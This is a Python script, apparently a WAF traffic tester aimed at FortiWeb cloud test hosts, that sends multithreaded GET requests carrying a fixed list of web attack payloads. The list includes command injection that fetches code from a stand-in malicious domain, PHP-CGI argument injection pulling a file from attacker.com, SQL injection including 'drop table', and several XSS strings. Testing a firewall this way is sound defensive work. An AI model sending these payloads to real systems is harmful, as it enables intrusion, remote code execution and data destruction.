import requests
import threading
import time
import queue as Queue
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# num=13
link_list = ['/bot',
            '/rootkit.php',
            '/test.php?path=%3Bwget%20http://malicious-domain/hack.php',
            '/cgi-bin/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp://attacker.com/evilcode.txt',
            '/stacked?a = 1; drop table b;',
            '/embedded?a = 1 and (select * from b where 1=1)',
            '/condition?a = 1 or 1 = 1',
            '/arithmetic?a = 1*1*1*1',
            '/sqlfunction?a = MOD(x,y)',
            '/tag?a=<input onfocus=write(1) autofocus>',
            '/attribute?id=1 onload="alert(0)"',
            '/css?a="style=-moz-binding:url(http://h4k.in/mozxss.xml#xss); a="',
            '/jsfunction?a=function test(){A=alert;A(1)}']
            #'/id=hello";document.body.innerHTML="ddddd"//'

class myThread(threading.Thread):
    def __init__(self, name, q, prefix):
        threading.Thread.__init__(self)
        self.name = name
        self.q = q
        self.prefix = prefix
    def run(self):
        print("Starting " + self.name)
        while True:
            try:
                crawler(self.name, self.q, self.prefix)
            except:
                break
        print("Exiting " + self.name)
 
def crawler(threadName, q, prefix):
    url = q.get(timeout=2)
    headers = None
    if url == "/bot" :
        headers = {'User-Agent':'Cgichk'}
    elif url == "/rootkit.php" :
        headers = {'X_File':'data.txt'}
    try:
        resp = requests.get(prefix + url, headers=headers, verify=False, timeout=20)
        # 打印：队列长度，线程名，响应吗，正在访问的url
        print(q.qsize(),threadName,resp.status_code,url)
    except Exception as e:
        print(q.qsize(),threadName,"Error: ", url, e)
 
def threads_run(prefix, repeat_num, thread_num):
    start = time.time()
    print ('domain:', prefix)

    # 创建n个线程名
    # thread_num = 20
    threadList = []
    for i in range(thread_num) : 
        threadList.append('Thread-'+ str(i))
     
    # 设置队列长度
    workQueue = Queue.Queue(1000)
     
    # 线程池
    threads = []

    #创建新线程
    for tName in threadList:
        thread = myThread(tName,workQueue, prefix)
        thread.start()
        threads.append(thread)
     
    #将url填充到队列
    for _ in range(repeat_num): 
        for url in link_list:
            workQueue.put(url)
     
    #等待所有线程完成
    for t in threads:
        t.join()
     
    end = time.time()
    print('Total time：', end-start)
    print('Exiting Main Thread')

# prefix = 'https://52.78.82.9:8080'
# threads_run(prefix, 50, 20)

# for i in range(6):
#     if i % 2 == 0: 
#         threads_run('https://ygeng-prod-data.fortiweb-cloud-test.com', 10, 10)
#     else:
#         threads_run('https://ygeng-prod-data2.fortiweb-cloud-test.com', 10, 10) 
#     print (">>>>>>>>>>>>>> Wait for 10 seconds...\b")
#     time.sleep(10)

# prefix = 'https://52.78.82.9:8080'
# threads_run(prefix, 1, 10)